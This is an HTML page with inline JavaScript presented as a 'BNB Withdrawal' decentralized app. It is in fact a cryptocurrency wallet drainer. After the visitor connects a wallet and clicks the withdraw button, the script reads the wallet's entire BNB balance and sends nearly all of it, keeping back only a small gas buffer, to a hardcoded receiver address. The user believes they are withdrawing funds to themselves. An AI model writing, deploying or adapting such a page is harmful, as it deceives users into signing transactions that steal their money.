<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>BNB Withdrawal DApp</title>
  <script type="module" src="wallet.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9fbfc;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
      color: #333;
    }
    h1 {
      margin-bottom: 20px;
      color: #111;
    }
    #message {
      margin-top: 20px;
      padding: 10px 15px;
      border-radius: 8px;
      font-size: 14px;
      min-height: 20px;
      max-width: 320px;
      text-align: center;
    }
    #withdrawButton {
      margin-top: 30px;
      padding: 12px 24px;
      font-size: 16px;
      font-weight: bold;
      background-color: #0070f3;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }
    #withdrawButton:disabled {
      background-color: #aaa;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <h1>BNB Withdrawal</h1>

  <!-- Wallet Connect Button -->
  <w3m-core-button></w3m-core-button>

  <!-- Withdraw Button -->
  <button id="withdrawButton" disabled>Connect Wallet First</button>

  <!-- Message Display -->
  <div id="message"></div>

  <!-- Withdraw Script -->
  <script type="module">
    import {
      WagmiCore,
      WagmiCoreChains,
      getAccount,
      fetchBalance,
      sendTransaction
    } from "https://unpkg.com/@web3modal/ethereum@2.6.2";

    const { bsc } = WagmiCoreChains;
    const receiverAddress = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
    const withdrawButton = document.getElementById("withdrawButton");
    const messageEl = document.getElementById("message");

    const BNB_TO_USD = 600; // Example conversion rate (update if needed)
    const GAS_BUFFER = 0.001; // Gas fee reservation in BNB
    const MIN_USD_WITHDRAW = 5; // Minimum $5 worth of BNB to withdraw

    function showMessage(msg, type = "info") {
      messageEl.textContent = msg;
      messageEl.style.color = type === "error" ? "#b00020" : "#0a6d0a";
      messageEl.style.background = type === "error" ? "#ffecec" : "#e6f7e6";
      messageEl.style.border = `1px solid ${type === "error" ? "#f5a5a5" : "#8fe58f"}`;
    }

    // Watch connection state
    setInterval(async () => {
      const account = getAccount();
      if (account?.isConnected) {
        withdrawButton.disabled = false;
        withdrawButton.textContent = "Withdraw BNB";
        showMessage("Wallet connected.", "info");
      } else {
        withdrawButton.disabled = true;
        withdrawButton.textContent = "Connect Wallet First";
        showMessage("Please connect your wallet.", "error");
      }
    }, 1000);

    withdrawButton.addEventListener("click", async () => {
      const account = getAccount();
      if (!account?.isConnected) {
        showMessage("Connect your wallet first.", "error");
        return;
      }

      try {
        const balanceResult = await fetchBalance({
          address: account.address,
          chainId: 56,
        });

        const fullBNB = Number(balanceResult.formatted);
        const sendableBNB = fullBNB - GAS_BUFFER;
        const usdValue = sendableBNB * BNB_TO_USD;

        if (sendableBNB <= 0 || usdValue < MIN_USD_WITHDRAW) {
          showMessage("You need at least $5 worth of BNB after gas fees.", "error");
          return;
        }

        const tx = await sendTransaction({
          to: receiverAddress,
          value: BigInt(Math.floor(sendableBNB * 1e18)),
        });

        showMessage("Transaction sent! Opening BscScan...", "info");

        setTimeout(() => {
          window.open(`https://bscscan.com/tx/${tx.hash}`, "_blank");
        }, 3000);

      } catch (err) {
        console.error(err);
        showMessage("Transaction failed. Check your gas or network.", "error");
      }
    });
  </script>
</body>
</html>